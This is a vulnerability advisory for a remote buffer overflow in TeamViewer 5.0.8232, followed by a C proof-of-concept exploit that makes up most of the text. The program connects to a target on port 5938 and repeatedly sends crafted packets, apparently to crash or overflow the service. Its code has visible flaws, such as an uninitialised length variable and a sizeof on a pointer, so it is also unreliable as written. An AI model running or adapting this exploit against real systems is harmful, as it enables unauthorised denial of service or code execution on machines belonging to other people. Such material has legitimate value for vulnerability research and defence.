source: http://www.securityfocus.com/bid/40242/info

TeamViewer is prone to a remote buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied data.

An attacker can leverage this issue to execute arbitrary code within the context of the vulnerable application. Failed exploit attempts will result in a denial-of-service condition.

TeamViewer 5.0.8232 is vulnerable; other versions may be affected. 

#include<stdio.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<unistd.h>
 
#define ALOC(tip,n) (tip*)malloc(sizeof(tip)*n)
#define POCNAME "[*]TeamViewer 5.0.8232 remote BOF poc(0day)"
#define AUTHOR "[*]fl0 fl0w"
 
   typedef int i32;
   typedef char i8;
   typedef short i16;
   enum {
        True=1,
        False=0,
        Error=-1       
   };
   struct  linger  ling = {1,1};
   i8* host;
   i16 port;
   i32 ver1,ver2,slen;
   void syntax(){
             i8 *help[]={"\t-h hostname",
                        "\t-p port(default 5938)",
                };
                i32 i;
                size_t com=sizeof help / sizeof help[0];
                for(i=0;i<com;i++){
                   printf("%s\n",help[i]); 
               }
        }
    i32 arguments(i32 argc,i8** argv){
         i32 i;
         argc--;
         for(i=1;i<argc;i++){
            switch(argv[i][1]){
                  case'h':
                          host=argv[++i];
                  break;
                  case'p':
                          port=atoi(argv[++i]);
                  break;                        
                  default:{
                          printf("error with argument nr %d:(%s)\n",i,argv[i]);
                  return Error;
                          exit(0); 
                }      
            }                
         }
    }   
    i32 main(i32 argc,i8** argv){
        if(argc<2){
               printf("%s\n%s\n",POCNAME,AUTHOR);       
               printf("\tToo few arguments\n syntax is:\n");
               syntax();
               exit(0);       
            }
            arguments(argc,argv);
        i32 sok,i,
            svcon,
            sokaddr;
             
        i8 *sendbytes=ALOC(i8,32768),   
           *recevbytes=ALOC(i8,5548);
            printf("[*]Starting \n \t...\n");   
            struct sockaddr_in sockaddr_sok;
            sokaddr = sizeof(sockaddr_sok);
            sockaddr_sok.sin_family = AF_INET;
            sockaddr_sok.sin_addr.s_addr = inet_addr(host);
            sockaddr_sok.sin_port = htons(port);
            sok=socket(AF_INET,SOCK_STREAM,0);
                        if(sok==-1){
                          printf("[*]FAILED SOCKET\n");
                          exit(0);
                       }
            if(svcon=connect(sok,(struct sockaddr*)&sockaddr_sok,sokaddr)<0){
               printf("Error with connection\n");
               shutdown(sok,1);
               exit(0);
            }
            if(setsockopt(sok, SOL_SOCKET, SO_LINGER, (i8*)&ling, sizeof(ling))<0){
                               printf("Error setting the socket\n");
                                              shutdown(sok,1);
                                exit(0);
            }
            if(recv(sok,&ver1,1,0)!=1)
               exit(0);
            if(recv(sok, &ver2,1,0)!=1)
               exit(0);
            memset(sendbytes,0,250);
            recv(sok,recevbytes,sizeof(recevbytes),0);
            for(i=0;;i++) {
               if(!(i & 15)) printf("%d\r", i);
                  sendbytes[0] = ver1;
                  sendbytes[1] = ver2;
                  sendbytes[2] = (i & 1) ? 15 : 21;  
            *(i16 *)(sendbytes + 3) = slen;
                 if(send(sok, sendbytes, 5, 0) != 5) break;
 
                   if(slen) { 
                     memset(sendbytes, i, slen);
                     if(send(sok, sendbytes, slen, 0) != slen) break;
                     }
           }
           shutdown(sok,1);
           return 0;
    }
